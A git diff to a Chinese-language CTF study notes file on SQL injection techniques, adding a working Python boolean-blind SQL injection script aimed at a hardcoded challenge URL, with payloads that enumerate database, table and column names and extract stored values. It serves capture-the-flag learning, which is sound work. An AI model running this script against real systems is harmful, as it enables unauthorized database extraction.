@@ -188,6 +188,45 @@ for i in files:
 - 堆叠注入+符号`||`的利用。例题:[EasySQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/EasySQL.md)
 - 联合查询（union select）会构造虚拟数据，利用此虚拟数据可以伪造登录。例题：[BabySQli](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/BabySQli.md)
 - 二分法异或盲注。例题:[[极客大挑战 2019]FinalSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL.md)
+  - 在这道题的基础上改动，使其成为通用的mysql布尔盲注脚本。当然改一下if语句的内容也能做延时注入（时间盲注）脚本。
+```python
+import requests
+url="http://62.173.140.174:26001/user.php"
+def payload(i, j):
+    # 数据库名字
+    #sql = f"test'/**/and/**/if(ascii(substr(database(),{i},1))>{j},1,0)#"
+    # 表名
+    #sql = f"test'/**/and/**/if((ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='data'),{i},1))>{j}),1,0)#"
+    # 列名
+    # sql = f"test'/**/and/**/if((ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flags')),{i},1))>{j}),1,0)#"
+    # 查询flag
+    sql = f"test'/**/and/**/if((ord(substr((select(group_concat(flag))from(flags)),{i},1))>{j}),1,0)#"
+    data={'login':sql,'password':'test'}
+    r = requests.get(url, params=data)
+    if "User" in r.text:
+       res = 1
+    else:
+       res = 0
+    return res
+def exp():
+    flag=""
+    for i in range(1, 10000):
+        low = 31
+        high = 127
+        while low <= high:
+              mid = (low + high) // 2
+              res = payload(i, mid)
+              if res:
+                 low = mid + 1
+              else:
+                 high = mid - 1
+        f = int((low + high + 1)) // 2
+        if (f == 127 or f == 31):
+           break
+        flag += chr(f)
+        print(flag)
+exp()
+```  
 - sql正则regexp+二次注入+updatexml报错注入。例题:[[RCTF2015]EasySQL](../../CTF/BUUCTF/Web/[RCTF2015]EasySQL.md)
 29. php使用读取文件的不同方式，可用于绕过滤。
 
